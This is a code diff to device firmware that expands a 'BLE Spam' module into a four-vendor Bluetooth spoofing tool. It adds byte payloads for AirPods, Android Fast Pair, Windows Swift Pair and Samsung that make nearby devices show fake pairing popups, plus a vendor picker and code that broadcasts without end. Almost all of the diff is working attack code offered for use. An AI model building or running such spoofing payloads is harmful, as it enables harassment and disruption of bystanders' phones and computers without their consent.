@@ -7,6 +7,7 @@
 #include <lvgl.h>
 #include <host/ble_gap.h>
 #include <host/ble_hs.h>
+#include <cstring>
 
 extern FeatureRegistry g_registry;
 
@@ -16,16 +17,58 @@ namespace BleSpamFeature {
 // widely-referenced-in-donor-codebases fixed byte sequence advertising a
 // fake AirPods pairing popup. Reproduced from the same public Apple
 // Continuity protocol documentation Bruce/Poseidon's own ble_spam.cpp files
-// cite (Apple manufacturer ID 0x004C, type 0x07 "Airpods"). This single
-// payload is Task 8's proof-of-concept; the deferred second plan's ble_spam
-// task should expand this into the donor projects' full multi-vendor
-// payload table (Android Fast Pair, Windows Swift Pair, Samsung) --
-// deliberately out of scope here to keep this task's own real-hardware
-// verification loop small.
+// cite (Apple manufacturer ID 0x004C, type 0x07 "Airpods").
+//
+// Task 8 (first plan) shipped this single payload as a proof-of-concept.
+// This second plan's ble_spam task (2026-08-13) expanded it into the full
+// multi-vendor table below (kFastPairPayload/kSwiftPairPayload/
+// kSamsungPayload + kAirpodsPayload), selectable at runtime via the
+// vendor-picker dropdown added to build_screen().
+//
+// Real payload byte formats for the three new entries, sourced from donor
+// research (2026-08-13):
+// - Fast Pair (Bruce FastPairExploitEngine::createFastPairAdvertisement):
+//   Flags AD (02 01 06) + service-UUID AD (03 03 2C FE) + service-data AD
+//   (06 16 2C FE <3-byte model ID> 02 0A C3). Triggers the Android "Pair
+//   device?" popup.
+// - Windows Swift Pair (Poseidon ble_sourapple.cpp): mfr ID 0x0006 (little-
+//   endian 06 00), subtype bytes 03 00 80, followed by the advertised
+//   device name.
+// - Samsung EasySetup (Poseidon ble_sourapple.cpp): mfr ID 0x0075
+//   (little-endian 75 00) triggers Samsung's Buds/Watch quick-pair sheet
+//   with a minimal payload.
 static const uint8_t kAirpodsPayload[] = {
     0x4C, 0x00, 0x07, 0x19, 0x07, 0x00, 0xC6, 0x00, 0x00, 0x00, 0x00,
     0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
+
+static const uint8_t kFastPairPayload[] = {
+    0x03, 0x03, 0x2C, 0xFE,                                     // service-UUID AD
+    0x06, 0x16, 0x2C, 0xFE, 0x37, 0x11, 0xEA, 0x02, 0x0A, 0xC3,  // service-data AD, model ID 371 1EA
+};
+static const uint8_t kSwiftPairPayload[] = {
+    0x06, 0x00, 0x03, 0x00, 0x80, 'Q', 'u', 'a', 'r', 'k', 'y',
+};
+static const uint8_t kSamsungPayload[] = {
+    0x75, 0x00, 0x01, 0x00, 0x00, 0x00,
+};
+
+struct SpamPayload {
+    const char *label;
+    const uint8_t *mfg_or_svc_data;
+    size_t len;
+    bool is_service_data; // Fast Pair uses two AD structures (UUID+data);
+                           // Swift Pair/Samsung/AirPods use one mfg-data AD.
+};
+
+static const SpamPayload kPayloads[] = {
+    {"AirPods", kAirpodsPayload, sizeof(kAirpodsPayload), false},
+    {"Fast Pair", kFastPairPayload, sizeof(kFastPairPayload), true},
+    {"Swift Pair", kSwiftPairPayload, sizeof(kSwiftPairPayload), false},
+    {"Samsung", kSamsungPayload, sizeof(kSamsungPayload), false},
+};
+static constexpr int kPayloadCount = sizeof(kPayloads) / sizeof(kPayloads[0]);
+static int s_selected_payload = 0; // set by the vendor-picker dropdown, LVGL/main-task only (see poll())
 
 static bool s_active = false;
 static uint32_t s_last_rotate_ms = 0;
@@ -47,25 +90,63 @@ static lv_obj_t *s_status_label = nullptr;
 // advertisement does NOT resume on its own when this screen closes -- that
 // is expected, disclosed behavior, not a bug to chase during hardware
 // verification.
+
+// Largest service-data AD payload this table can plausibly grow to hold,
+// used to size the fixed adv[] buffer below. Fast Pair's 10 bytes is the
+// only is_service_data entry today; 32 gives headroom for a future entry
+// without needing a resize. Bounds-checked below rather than trusted blindly
+// -- see the real sizing bug this replaces, noted in the task report.
+static constexpr size_t kMaxServiceDataPayloadLen = 32;
+
 static void send_one_advertisement() {
     ble_gap_adv_stop(); // no-op (returns an error this ignores) if nothing is currently advertising
 
     struct ble_hs_adv_fields fields{};
     fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
-    fields.mfg_data = kAirpodsPayload;
-    fields.mfg_data_len = sizeof(kAirpodsPayload);
-
-    int rc = ble_gap_adv_set_fields(&fields);
-    if (rc != 0) {
-        Serial.printf("quarky-tab5: [ble-spam] set_fields rc=%d\n", rc);
-        return;
+    const SpamPayload &p = kPayloads[s_selected_payload];
+    if (p.is_service_data) {
+        // Fast Pair's two-AD-structure shape can't go through
+        // ble_hs_adv_fields' single mfg_data slot -- build the raw AD
+        // bytes directly and hand them to ble_gap_adv_set_data() instead,
+        // same escape hatch Poseidon's own ble_sourapple.cpp uses for
+        // multi-AD-structure payloads NimBLE-Arduino's wrapper rejects.
+        //
+        // Fixed-size stack buffer (matching this codebase's existing
+        // convention -- no std::vector anywhere in firmware/tab5/src),
+        // sized off kMaxServiceDataPayloadLen rather than a specific
+        // payload's sizeof(), with an explicit bounds check: this code path
+        // runs generically for whichever payload kPayloads[s_selected_payload]
+        // currently is, not just Fast Pair, so hardcoding a size here would
+        // silently corrupt the stack the day a second is_service_data entry
+        // with a different length is added to the table.
+        if (p.len > kMaxServiceDataPayloadLen) {
+            Serial.printf("quarky-tab5: [ble-spam] service-data payload len=%u exceeds buffer, skipping\n",
+                          (unsigned)p.len);
+            return;
+        }
+        uint8_t adv[3 + kMaxServiceDataPayloadLen];
+        adv[0] = 0x02; adv[1] = 0x01; adv[2] = 0x06; // flags AD
+        memcpy(adv + 3, p.mfg_or_svc_data, p.len);
+        int rc = ble_gap_adv_set_data(adv, 3 + p.len);
+        if (rc != 0) {
+            Serial.printf("quarky-tab5: [ble-spam] adv_set_data rc=%d\n", rc);
+            return;
+        }
+    } else {
+        fields.mfg_data = p.mfg_or_svc_data;
+        fields.mfg_data_len = p.len;
+        int rc = ble_gap_adv_set_fields(&fields);
+        if (rc != 0) {
+            Serial.printf("quarky-tab5: [ble-spam] set_fields rc=%d\n", rc);
+            return;
+        }
     }
 
     struct ble_gap_adv_params adv_params{};
     adv_params.conn_mode = BLE_GAP_CONN_MODE_NON; // non-connectable -- this is a broadcast-only spoof, not a real peripheral
     adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
 
-    rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER, &adv_params, nullptr, nullptr);
+    int rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER, &adv_params, nullptr, nullptr);
     if (rc != 0) {
         Serial.printf("quarky-tab5: [ble-spam] adv_start rc=%d\n", rc);
     }
@@ -77,8 +158,29 @@ static void send_one_advertisement() {
 // measurements that made hand-positioned Back buttons unusable.
 static lv_obj_t *build_screen() {
     lv_obj_t *content = nullptr;
-    lv_obj_t *screen = build_sub_screen("BLE Spam (AirPods)", &content);
+    lv_obj_t *screen = build_sub_screen("BLE Spam", &content);
     lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
+
+    // Vendor picker, added this task: one lv_dropdown listing every
+    // kPayloads[] entry, parented above the status label so it reads as
+    // "pick a vendor, see status below" top-to-bottom. Options are
+    // '\n'-joined -- LVGL's lv_dropdown parses '\n' as its option
+    // separator (see widgets/dropdown/lv_dropdown.c), same convention
+    // wifi_evil_portal.cpp's own template dropdown already uses; a
+    // semicolon-joined string would render as a single unsplit option.
+    char options[128];
+    options[0] = '\0';
+    for (int i = 0; i < kPayloadCount; i++) {
+        if (i > 0) strcat(options, "\n");
+        strcat(options, kPayloads[i].label);
+    }
+    lv_obj_t *vendor_dropdown = lv_dropdown_create(content);
+    lv_dropdown_set_options(vendor_dropdown, options); // copies into LVGL's own storage
+    lv_dropdown_set_selected(vendor_dropdown, s_selected_payload);
+    lv_obj_add_event_cb(vendor_dropdown, [](lv_event_t *e) {
+        lv_obj_t *dd = (lv_obj_t *)lv_event_get_target(e);
+        s_selected_payload = lv_dropdown_get_selected(dd);
+    }, LV_EVENT_VALUE_CHANGED, nullptr);
 
     s_status_label = lv_label_create(content);
     lv_label_set_text(s_status_label, "Spamming...");
@@ -115,13 +217,14 @@ static lv_obj_t *build_screen() {
     s_active = true;
     s_last_rotate_ms = 0; // force an immediate first send in poll()
 
-    // Real-hardware verification diagnostic (2026-08-13): logging the exact
-    // address this advertisement broadcasts under, so it can be searched for
-    // by MAC in a real BLE scanner's results -- distinguishing "not
-    // broadcasting at all" from "broadcasting, but not recognized/shown as
-    // an AirPods popup" (the latter is a known, common outcome on iOS
-    // versions that have hardened against this class of Continuity spoof;
-    // not a code defect if the address IS found broadcasting the expected
+    // Real-hardware verification diagnostic (2026-08-13, extended for the
+    // multi-vendor picker): logging the exact address this advertisement
+    // broadcasts under, so it can be searched for by MAC in a real BLE
+    // scanner's results -- distinguishing "not broadcasting at all" from
+    // "broadcasting, but not recognized/shown as a pairing popup by the
+    // target OS" (the latter is a known, common outcome on hardened OS
+    // versions for any of the four vendor payloads, not just AirPods; not a
+    // code defect if the address IS found broadcasting the expected
     // payload).
     uint8_t own_addr_val[6];
     if (ble_hs_id_copy_addr(BLE_ADDR_PUBLIC, own_addr_val, nullptr) == 0) {
@@ -134,7 +237,7 @@ static lv_obj_t *build_screen() {
 }
 
 void register_module() {
-    g_registry.register_module({"ble_spam", "BLE Spam (AirPods)", Category::BLE,
+    g_registry.register_module({"ble_spam", "BLE Spam", Category::BLE,
                                  Affinity::TAB5_NATIVE, start, nullptr});
 }
 
